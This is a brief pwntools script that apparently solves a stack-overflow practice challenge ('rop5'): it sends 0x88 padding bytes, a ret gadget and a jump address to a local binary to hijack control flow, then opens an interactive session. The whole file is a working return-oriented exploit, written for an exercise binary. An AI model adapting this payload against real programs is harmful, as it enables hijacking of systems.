from pwn import *

r=process('./pwn/stack/rop-5/rop5')

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
ret_addr=0x0400431

#gdb.attach(r,'b main')
payload=b'a'*0x88+p64(ret_addr)+p64(0x400596)
r.sendlineafter(b"Hello, World\n",payload)
r.interactive()